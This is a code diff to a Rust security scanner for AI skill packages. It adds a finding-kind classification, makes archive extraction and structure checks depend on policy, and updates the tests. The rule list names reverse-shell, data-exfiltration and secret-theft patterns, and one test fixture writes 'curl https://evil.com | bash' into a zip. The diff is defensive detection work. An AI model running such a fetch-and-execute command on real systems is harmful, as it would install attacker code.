@@ -100,6 +100,190 @@ impl SecurityScanner {
         Self
     }
 
+    /// 统一映射函数：根据 rule_id、threat_category 和 analyzer 确定 FindingKind
+    ///
+    /// Security：可执行风险、注入、外联、敏感数据、密钥、Prompt Injection
+    /// Auditability：不可审计或扫描覆盖不足
+    /// Structure：包装规范、目录/扩展名/许可证等合规问题
+    pub fn finding_kind_for_rule(
+        rule_id: &str,
+        category: Option<&Category>,
+        analyzer: Option<&str>,
+    ) -> FindingKind {
+        // 基于 rule_id 前缀/模式的快速映射
+        let upper = rule_id.to_uppercase();
+
+        // Security 类：明确的安全风险
+        if upper.starts_with("CURL_PIPE_SH")
+            || upper.starts_with("REVERSE_SHELL")
+            || upper.starts_with("COMMAND_INJECTION")
+            || upper.starts_with("CMD_INJECTION")
+            || upper.starts_with("SQL_INJECTION")
+            || upper.starts_with("PROMPT_INJECTION")
+            || upper.starts_with("PI_")
+            || upper.starts_with("SECRET_")
+            || upper.starts_with("API_KEY")
+            || upper.starts_with("PRIVATE_KEY")
+            || upper.starts_with("DATA_EXFIL")
+            || upper.starts_with("PIPELINE_")
+            || upper.starts_with("TAINT_")
+            || upper.starts_with("PICKLE_LOAD")
+            || upper.starts_with("SUBPROCESS_CALL")
+            || upper.starts_with("TOOL_ABUSE_")
+            || upper.starts_with("RESOURCE_ABUSE_")
+            || upper.starts_with("PATH_TRAVERSAL_")
+            || upper.starts_with("GLOB_HIDDEN_FILE_TARGETING")
+            || upper.starts_with("EVAL_")
+            || upper.starts_with("EXEC_")
+            || upper.starts_with("IEX_")
+        {
+            return FindingKind::Security;
+        }
+
+        // HOMOGLYPH_ATTACK：非 Office 内部 XML 时为 Security
+        if upper.starts_with("HOMOGLYPH_ATTACK") {
+            // 如果 analyzer 是 homoglyph 且来自 Office XML，降为 Auditability
+            // 这里先返回 Security，调用方可以覆盖
+            return FindingKind::Security;
+        }
+
+        // FILE_MAGIC_MISMATCH：文本/图片伪装可执行、归档、Office 时为 Security
+        if upper.starts_with("FILE_MAGIC_MISMATCH") {
+            return FindingKind::Security;
+        }
+
+        // Auditability 类：不可审计或扫描覆盖不足
+        if upper.starts_with("ARCHIVE_FILE_DETECTED")
+            || upper.starts_with("ARCHIVE_NESTED_TOO_DEEP")
+            || upper.starts_with("ARCHIVE_CONTAINS_EXECUTABLE")
+            || upper.starts_with("UNANALYZABLE_BINARY")
+            || upper.starts_with("OVERSIZED_FILE")
+            || upper.starts_with("LOW_ANALYZABILITY")
+            || upper.starts_with("STRUCTURE_BINARY_CONTENT")
+        {
+            return FindingKind::Auditability;
+        }
+
+        // Office/PDF/bytecode 存在
+        if upper.starts_with("OFFICE_") && !upper.contains("VBA") && !upper.contains("OLE") {
+            return FindingKind::Auditability;
+        }
+        if upper.starts_with("PDF_") {
+            return FindingKind::Auditability;
+        }
+        if upper.starts_with("BYTECODE_") {
+            return FindingKind::Auditability;
+        }
+
+        // VBA/OLE 是明确的安全风险
+        if upper.starts_with("OFFICE_VBA_MACRO") || upper.starts_with("OFFICE_EMBEDDED_OLE") {
+            return FindingKind::Security;
+        }
+
+        // Archive 路径穿越/symlink/zip bomb 是安全风险
+        if upper.starts_with("ARCHIVE_PATH_TRAVERSAL")
+            || upper.starts_with("ARCHIVE_SYMLINK")
+            || upper.starts_with("ARCHIVE_ZIP_BOMB")
+        {
+            return FindingKind::Security;
+        }
+
+        // Structure 类：包装规范、目录/扩展名/许可证等合规问题
+        if upper.starts_with("STRUCTURE_DISALLOWED_SUBDIR")
+            || upper.starts_with("STRUCTURE_DISALLOWED_EXTENSION")
+            || upper.starts_with("STRUCTURE_NAME_DIR_MISMATCH")
+            || upper.starts_with("MANIFEST_MISSING_LICENSE")
+            || upper.starts_with("STRUCTURE_ORPHAN_SCRIPT")
+            || upper.starts_with("TRIGGER_DESCRIPTION_TOO_SHORT")
+            || upper.starts_with("TRIGGER_KEYWORD_BAITING")
+            || upper.starts_with("TRIGGER_VAGUE_DESCRIPTION")
+        {
+            return FindingKind::Structure;
+        }
+
+        // 基于 ThreatCategory 的兜底映射
+        if let Some(cat) = category {
+            match cat {
+                Category::CmdInjection
+                | Category::RemoteExec
+                | Category::Destructive
+                | Category::Network
+                | Category::Secrets
+                | Category::SensitiveFileAccess
+                | Category::PromptInjection
+                | Category::PrivilegeEscalation
+                | Category::Persistence => return FindingKind::Security,
+                Category::Obfuscation => return FindingKind::Auditability,
+                Category::SocialEngineering => return FindingKind::Structure,
+                Category::PolicyViolation => {
+                    // PolicyViolation 中可能包含 allowed-tools 越权等有安全意义的条目
+                    // 默认为 Structure，但可被具体规则覆盖
+                    return FindingKind::Structure;
+                }
+            }
+        }
+
+        // 基于 analyzer 的兜底
+        if let Some(analyzer_name) = analyzer {
+            match analyzer_name {
+                "strict_structure" => return FindingKind::Structure,
+                "analyzability" => return FindingKind::Auditability,
+                "archive_extractor" | "archive_inventory" => return FindingKind::Auditability,
+                "pipeline" => return FindingKind::Security,
+                _ => {}
+            }
+        }
+
+        // 默认为 Security（保守策略）
+        FindingKind::Security
+    }
+
+    fn finding_kind_from_finding(finding: &crate::models::security::Finding) -> FindingKind {
+        finding
+            .metadata
+            .as_ref()
+            .and_then(|m| m.finding_kind)
+            .unwrap_or_else(|| {
+                Self::finding_kind_for_rule(&finding.rule_id, None, Some(&finding.analyzer))
+            })
+    }
+
+    fn should_include_structure_kind(
+        kind: FindingKind,
+        policy: &crate::security::policy::ScanPolicy,
+    ) -> bool {
+        kind != FindingKind::Structure || policy.strict_structure_enabled
+    }
+
+    fn should_include_context_finding(
+        finding: &crate::models::security::Finding,
+        policy: &crate::security::policy::ScanPolicy,
+    ) -> bool {
+        Self::should_include_structure_kind(Self::finding_kind_from_finding(finding), policy)
+    }
+
+    fn should_include_match(
+        matched: &MatchResult,
+        policy: &crate::security::policy::ScanPolicy,
+    ) -> bool {
+        Self::should_include_structure_kind(
+            Self::finding_kind_for_rule(&matched.rule_id, Some(&matched.category), None),
+            policy,
+        )
+    }
+
+    fn is_office_xml_internal_path(file_path: &str) -> bool {
+        let lower = file_path.replace('\\', "/").to_ascii_lowercase();
+        if !lower.contains('>') {
+            return false;
+        }
+        lower.contains(">word/")
+            || lower.contains(">xl/")
+            || lower.contains(">ppt/")
+            || lower.contains(">[content_types].xml")
+            || lower.contains(">_rels/")
+    }
+
     fn effective_rule_weight(matched: &MatchResult) -> f32 {
         let base = matched.weight as f32;
         if matched.hard_trigger {
@@ -117,6 +301,7 @@ impl SecurityScanner {
         } else {
             Some(m.code_snippet.clone())
         };
+        let finding_kind = Self::finding_kind_for_rule(&m.rule_id, Some(&m.category), None);
         SecurityIssue {
             severity: m.severity.into(),
             category: Self::map_category(&m.category),
@@ -130,6 +315,7 @@ impl SecurityScanner {
             cwe_id: m.cwe_id.clone(),
             threat_category: Some(m.category.as_str().to_string()),
             same_path_other_rule_ids: None,
+            finding_kind: Some(finding_kind.as_str().to_string()),
         }
     }
 
@@ -147,6 +333,8 @@ impl SecurityScanner {
             .as_ref()
             .map(|m| m.same_path_other_rule_ids.clone())
             .filter(|v| !v.is_empty());
+        // 优先使用 finding metadata 中的 finding_kind，否则从 rule_id 推断
+        let finding_kind = Self::finding_kind_from_finding(finding);
         SecurityIssue {
             severity: finding.severity,
             category: finding.category.to_issue_category(),
@@ -160,6 +348,7 @@ impl SecurityScanner {
             cwe_id: finding.metadata.as_ref().and_then(|m| m.cwe_id.clone()),
             threat_category: Some(finding.category.as_str().to_string()),
             same_path_other_rule_ids: same_path,
+            finding_kind: Some(finding_kind.as_str().to_string()),
         }
     }
 
@@ -670,9 +859,13 @@ impl SecurityScanner {
             }
         }
 
-        for finding in crate::security::homoglyph::check(content, file_path) {
-            Self::apply_finding_blocking(&finding, blocked, hard_trigger_issues);
-            all_issues.push(Self::issue_from_finding(&finding));
+        // 跳过归档内 Office XML 的 homoglyph 检测（如 docx>word/fontTable.xml）。
+        // 这些文件通常由 Office 生成，包含大量 Unicode 字符，容易产生误报
+        if !Self::is_office_xml_internal_path(file_path) {
+            for finding in crate::security::homoglyph::check(content, file_path) {
+                Self::apply_finding_blocking(&finding, blocked, hard_trigger_issues);
+                all_issues.push(Self::issue_from_finding(&finding));
+            }
         }
 
         for finding in crate::security::asset_checks::check_content(content, file_path) {
@@ -681,6 +874,9 @@ impl SecurityScanner {
         }
 
         for match_result in self.collect_matches_for_content(content, file_path, policy) {
+            if !Self::should_include_match(&match_result, policy) {
+                continue;
+            }
             if match_result.hard_trigger {
                 *blocked = true;
                 hard_trigger_issues.push(
@@ -704,6 +900,7 @@ impl SecurityScanner {
     fn run_skill_context_analyzers(
         &self,
         skill_ctx: &SkillContext,
+        policy: &crate::security::policy::ScanPolicy,
         all_issues: &mut Vec<SecurityIssue>,
         blocked: &mut bool,
         hard_trigger_issues: &mut Vec<String>,
@@ -711,17 +908,26 @@ impl SecurityScanner {
         let mut partial = false;
 
         for finding in crate::security::consistency_checker::check(skill_ctx) {
+            if !Self::should_include_context_finding(&finding, policy) {
+                continue;
+            }
             Self::apply_finding_blocking(&finding, blocked, hard_trigger_issues);
             all_issues.push(Self::issue_from_finding(&finding));
         }
 
         for finding in crate::security::pipeline::analyze(skill_ctx) {
+            if !Self::should_include_context_finding(&finding, policy) {
+                continue;
+            }
             Self::apply_finding_blocking(&finding, blocked, hard_trigger_issues);
             all_issues.push(Self::issue_from_finding(&finding));
         }
 
         let analyzability_result = crate::security::analyzability::assess(skill_ctx);
         for finding in &analyzability_result.findings {
+            if !Self::should_include_context_finding(finding, policy) {
+                continue;
+            }
             Self::apply_finding_blocking(finding, blocked, hard_trigger_issues);
             all_issues.push(Self::issue_from_finding(finding));
         }
@@ -978,11 +1184,13 @@ impl SecurityScanner {
             }
         };
 
-        // 运行结构校验（仅 Directory 模式）
-        let structure_findings = strict_structure::validate(&skill_ctx);
-        for finding in &structure_findings {
-            Self::apply_finding_blocking(finding, &mut blocked, &mut total_hard_trigger_issues);
-            all_issues.push(Self::issue_from_finding(finding));
+        // 运行结构校验（仅 Directory 模式，且 strict_structure_enabled=true）
+        if policy.strict_structure_enabled {
+            let structure_findings = strict_structure::validate(&skill_ctx);
+            for finding in &structure_findings {
+                Self::apply_finding_blocking(finding, &mut blocked, &mut total_hard_trigger_issues);
+                all_issues.push(Self::issue_from_finding(finding));
+            }
         }
 
         // 递归遍历目录（不跟随 symlink），扫描文本文件内容
@@ -1047,6 +1255,7 @@ impl SecurityScanner {
                     cwe_id: Some("CWE-59".to_string()),
                     threat_category: Some("SensitiveFileAccess".to_string()),
                     same_path_other_rule_ids: None,
+                    finding_kind: Some(FindingKind::Security.as_str().to_string()),
                 });
                 continue;
             }
@@ -1072,6 +1281,7 @@ impl SecurityScanner {
                     cwe_id: None,
                     threat_category: None,
                     same_path_other_rule_ids: None,
+                    finding_kind: Some(FindingKind::Auditability.as_str().to_string()),
                 });
                 partial_scan = true;
                 break;
@@ -1136,6 +1346,7 @@ impl SecurityScanner {
                         cwe_id: None,
                         threat_category: None,
                         same_path_other_rule_ids: None,
+                        finding_kind: Some(FindingKind::Auditability.as_str().to_string()),
                     });
                     skipped_files.push(rel_str.clone());
                     partial_scan = true;
@@ -1161,6 +1372,7 @@ impl SecurityScanner {
                         cwe_id: None,
                         threat_category: None,
                         same_path_other_rule_ids: None,
+                        finding_kind: Some(FindingKind::Auditability.as_str().to_string()),
                     });
                     skipped_files.push(rel_str.clone());
                     partial_scan = true;
@@ -1187,11 +1399,12 @@ impl SecurityScanner {
                     cwe_id: None,
                     threat_category: None,
                     same_path_other_rule_ids: None,
+                    finding_kind: Some(FindingKind::Auditability.as_str().to_string()),
                 });
                 partial_scan = true;
             }
 
-            // ── 归档文件检测与提取 ──
+            // ── 归档文件检测 ──
             if crate::security::archive_extractor::detect_archive_type(&rel_str).is_some() {
                 if let Some(magic_finding) =
                     crate::security::file_magic::check_magic(&rel_str, &buf)
@@ -1203,13 +1416,11 @@ impl SecurityScanner {
                     );
                     all_issues.push(Self::issue_from_finding(&magic_finding));
                 }
+                // 输出 Auditability 级别的归档存在提示
                 all_issues.push(SecurityIssue {
                     severity: IssueSeverity::Low,
                     category: IssueCategory::Other,
-                    description: format!(
-                        "Archive file detected: {} (contents will be extracted and scanned)",
-                        rel_str
-                    ),
+                    description: format!("Archive file detected: {}", rel_str),
                     line_number: None,
                     code_snippet: None,
                     file_path: Some(rel_str.clone()),
@@ -1222,71 +1433,70 @@ impl SecurityScanner {
                     cwe_id: None,
                     threat_category: Some("Obfuscation".to_string()),
                     same_path_other_rule_ids: None,
+                    finding_kind: Some(FindingKind::Auditability.as_str().to_string()),
                 });
 
-                let extraction = crate::security::archive_extractor::extract_archive(
-                    file_path.to_str().unwrap_or(""),
-                    &policy,
-                );
-
-                // 添加归档 findings
-                for finding in &extraction.findings {
-                    Self::apply_finding_blocking(
-                        finding,
-                        &mut blocked,
-                        &mut total_hard_trigger_issues,
+                // 默认策略不解压归档；不可审计内容只降低信任。
+                if policy.archive_deep_scan_enabled {
+                    let extraction = crate::security::archive_extractor::extract_archive(
+                        file_path.to_str().unwrap_or(""),
+                        &policy,
                     );
-                    all_issues.push(Self::issue_from_finding(finding));
-                }
 
-                // 将提取的文件加入扫描队列
-                // 注意：提取的文件在临时目录中，扫描结束后会自动清理（TempDir drop）
-                if let Some(ref temp_dir) = extraction.temp_dir {
-                    for extracted_path in &extraction.extracted_files {
-                        let full_path = std::path::Path::new(extracted_path);
-                        if let Ok(f) = std::fs::File::open(full_path) {
+                    for finding in &extraction.findings {
+                        Self::apply_finding_blocking(
+                            finding,
+                            &mut blocked,
+                            &mut total_hard_trigger_issues,
+                        );
+                        all_issues.push(Self::issue_from_finding(finding));
+                    }
+
+                    if let Some(ref temp_dir) = extraction.temp_dir {
+                        for extracted_path in &extraction.extracted_files {
+                            let full_path = std::path::Path::new(extracted_path);
+                            let Ok(f) = std::fs::File::open(full_path) else {
+                                continue;
+                            };
                             let mut extracted_buf = Vec::new();
-                            // 限制归档提取文件的读取大小
                             if f.take(MAX_EXTRACTED_FILE_BYTES + 1)
                                 .read_to_end(&mut extracted_buf)
-                                .is_ok()
+                                .is_err()
                             {
-                                // 跳过二进制提取文件
-                                if extracted_buf.contains(&0u8) {
-                                    continue;
-                                }
-                                // 检查是否超过大小限制
-                                if extracted_buf.len() as u64 > MAX_EXTRACTED_FILE_BYTES {
-                                    log::warn!(
-                                        "Extracted file {} exceeds size limit ({} bytes), truncating",
-                                        full_path.display(),
-                                        MAX_EXTRACTED_FILE_BYTES
-                                    );
-                                    extracted_buf.truncate(MAX_EXTRACTED_FILE_BYTES as usize);
-                                }
-                                let extracted_content =
-                                    String::from_utf8_lossy(&extracted_buf).into_owned();
-                                // 使用 archive>inner 格式的路径便于追溯
-                                let extracted_display = format!(
-                                    "{}>{}",
-                                    rel_str,
-                                    full_path
-                                        .strip_prefix(temp_dir.path())
-                                        .unwrap_or(full_path)
-                                        .to_string_lossy()
-                                );
-                                self.scan_text_content(
-                                    &extracted_content,
-                                    &extracted_display,
-                                    Some(extracted_buf.as_slice()),
-                                    &policy,
-                                    locale,
-                                    &mut all_issues,
-                                    &mut all_matches,
-                                    &mut blocked,
-                                    &mut total_hard_trigger_issues,
-                                );
+                                continue;
                             }
+                            if extracted_buf.contains(&0u8) {
+                                continue;
+                            }
+                            if extracted_buf.len() as u64 > MAX_EXTRACTED_FILE_BYTES {
+                                log::warn!(
+                                    "Extracted file {} exceeds size limit ({} bytes), truncating",
+                                    full_path.display(),
+                                    MAX_EXTRACTED_FILE_BYTES
+                                );
+                                extracted_buf.truncate(MAX_EXTRACTED_FILE_BYTES as usize);
+                            }
+                            let extracted_content =
+                                String::from_utf8_lossy(&extracted_buf).into_owned();
+                            let extracted_display = format!(
+                                "{}>{}",
+                                rel_str,
+                                full_path
+                                    .strip_prefix(temp_dir.path())
+                                    .unwrap_or(full_path)
+                                    .to_string_lossy()
+                            );
+                            self.scan_text_content(
+                                &extracted_content,
+                                &extracted_display,
+                                Some(extracted_buf.as_slice()),
+                                &policy,
+                                locale,
+                                &mut all_issues,
+                                &mut all_matches,
+                                &mut blocked,
+                                &mut total_hard_trigger_issues,
+                            );
                         }
                     }
                 }
@@ -1339,6 +1549,7 @@ impl SecurityScanner {
 
         if self.run_skill_context_analyzers(
             &skill_ctx,
+            &policy,
             &mut all_issues,
             &mut blocked,
             &mut total_hard_trigger_issues,
@@ -1348,7 +1559,12 @@ impl SecurityScanner {
 
         Self::finalize_issues(&mut all_issues);
 
-        let score = Self::calculate_score_from_issues(&all_issues, &all_matches, blocked);
+        let score = Self::calculate_score_from_issues_with_policy(
+            &all_issues,
+            &all_matches,
+            blocked,
+            Some(&policy),
+        );
         let level = crate::models::security::SecurityLevel::from_score(score);
 
         let mut recommendations =
@@ -1361,6 +1577,7 @@ impl SecurityScanner {
             skill_id: skill_id.to_string(),
             score,
             level,
+            kind_counts: Some(Self::count_kinds(&all_issues)),
             issues: all_issues,
             recommendations,
             blocked,
@@ -1423,6 +1640,7 @@ impl SecurityScanner {
 
         if self.run_skill_context_analyzers(
             &skill_ctx,
+            &policy,
             &mut all_issues,
             &mut blocked,
             &mut hard_trigger_issues,
@@ -1432,7 +1650,12 @@ impl SecurityScanner {
 
         Self::finalize_issues(&mut all_issues);
 
-        let score = Self::calculate_score_from_issues(&all_issues, &all_matches, blocked);
+        let score = Self::calculate_score_from_issues_with_policy(
+            &all_issues,
+            &all_matches,
+            blocked,
+            Some(&policy),
+        );
         let level = SecurityLevel::from_score(score);
 
         let recommendations =
@@ -1442,6 +1665,7 @@ impl SecurityScanner {
             skill_id,
             score,
             level,
+            kind_counts: Some(Self::count_kinds(&all_issues)),
             issues: all_issues,
             recommendations,
             blocked,
@@ -1498,12 +1722,41 @@ impl SecurityScanner {
         ((base as f32) * mult).round() as i32
     }
 
+    /// 统计各 FindingKind 的数量
+    pub fn count_kinds(issues: &[SecurityIssue]) -> KindCounts {
+        let mut counts = KindCounts::default();
+        for issue in issues {
+            match issue.finding_kind.as_deref() {
+                Some("Security") => counts.security += 1,
+                Some("Auditability") => counts.auditability += 1,
+                Some("Structure") => counts.structure += 1,
+                _ => counts.security += 1, // 默认为 Security
+            }
+        }
+        counts
+    }
+
     /// 基于全部 issues（含 analyzer findings）计算安全评分；blocked 时封顶 29
+    ///
+    /// 只对 score_kinds 中的 kind 计分。如果 score_kinds 为空，则对所有 kind 计分（向后兼容）。
     fn calculate_score_from_issues(
         issues: &[SecurityIssue],
         matches: &[MatchResult],
         blocked: bool,
     ) -> i32 {
+        Self::calculate_score_from_issues_with_policy(issues, matches, blocked, None)
+    }
+
+    /// 基于全部 issues 计算安全评分，支持按 policy 的 score_kinds 过滤
+    fn calculate_score_from_issues_with_policy(
+        issues: &[SecurityIssue],
+        matches: &[MatchResult],
+        blocked: bool,
+        policy: Option<&crate::security::policy::ScanPolicy>,
+    ) -> i32 {
+        let score_kinds: Option<HashSet<String>> =
+            policy.map(|p| p.score_kinds.iter().map(|k| k.clone()).collect());
+
         let mut match_weights: HashMap<String, i32> = HashMap::new();
         for matched in matches {
             let weight = Self::effective_rule_weight(matched).round() as i32;
@@ -1514,6 +1767,16 @@ impl SecurityScanner {
 
         let mut rule_hits: HashMap<String, (i32, HashSet<String>)> = HashMap::new();
         for issue in issues {
+            // 按 score_kinds 过滤
+            if let Some(ref kinds) = score_kinds {
+                if !kinds.is_empty() {
+                    let kind = issue.finding_kind.as_deref().unwrap_or("Security");
+                    if !kinds.contains(kind) {
+                        continue;
+                    }
+                }
+            }
+
             let weight = Self::issue_effective_weight(issue, &match_weights);
             if weight <= 0 {
                 continue;
@@ -1548,15 +1811,18 @@ impl SecurityScanner {
         score
     }
 
-    /// 基于 YAML 规则匹配结果计算评分（单元测试与内部兼容）
-    fn calculate_score_weighted(&self, matches: &[MatchResult]) -> i32 {
-        let issues: Vec<SecurityIssue> = matches.iter().map(Self::issue_from_match).collect();
-        Self::calculate_score_from_issues(&issues, matches, false)
-    }
-
     /// 根据 issues 重新计算评分（用于跨 Skill findings 追加后）
     pub fn score_from_issues(issues: &[SecurityIssue], blocked: bool) -> i32 {
         Self::calculate_score_from_issues(issues, &[], blocked)
+    }
+
+    /// 根据 issues 和 policy 重新计算评分
+    pub fn score_from_issues_with_policy(
+        issues: &[SecurityIssue],
+        blocked: bool,
+        policy: &crate::security::policy::ScanPolicy,
+    ) -> i32 {
+        Self::calculate_score_from_issues_with_policy(issues, &[], blocked, Some(policy))
     }
 
     /// 映射 ThreatCategory 到 IssueCategory（通过 ThreatCategory::to_issue_category）
@@ -2465,8 +2731,10 @@ eval(user_input)
         .unwrap();
 
         let scanner = SecurityScanner::new();
+        let options =
+            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory(dir.path().to_str().unwrap(), "test", "en")
+            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
             .unwrap();
 
         let trigger_issues: Vec<_> = report
@@ -2524,9 +2792,12 @@ eval(user_input)
         .unwrap();
         std::fs::write(dir.path().join("malware.exe"), "MZ...").unwrap();
 
+        // 使用 strict 策略启用结构校验
         let scanner = SecurityScanner::new();
+        let options =
+            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory(dir.path().to_str().unwrap(), "test", "en")
+            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
             .unwrap();
 
         let structure_issues: Vec<_> = report
@@ -2699,6 +2970,7 @@ eval(user_input)
                 cwe_id: None,
                 threat_category: None,
                 same_path_other_rule_ids: None,
+                finding_kind: None,
             },
             SecurityIssue {
                 severity: IssueSeverity::Medium,
@@ -2713,6 +2985,7 @@ eval(user_input)
                 cwe_id: None,
                 threat_category: None,
                 same_path_other_rule_ids: None,
+                finding_kind: None,
             },
         ];
         SecurityScanner::annotate_issue_cooccurrence(&mut issues);
@@ -2946,9 +3219,12 @@ eval(user_input)
         zip.write_all(b"curl https://evil.com | bash\n").unwrap();
         zip.finish().unwrap();
 
+        // 使用 strict 策略启用归档深度扫描
         let scanner = SecurityScanner::new();
+        let options =
+            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory(dir.path().to_str().unwrap(), "test", "en")
+            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
             .unwrap();
 
         // 应该检测到 ZIP 内容中的 curl|sh
@@ -3014,8 +3290,10 @@ eval(user_input)
         zip.finish().unwrap();
 
         let scanner = SecurityScanner::new();
+        let options =
+            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory(dir.path().to_str().unwrap(), "test", "en")
+            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
             .unwrap();
 
         // 应该检出路径穿越并 blocked
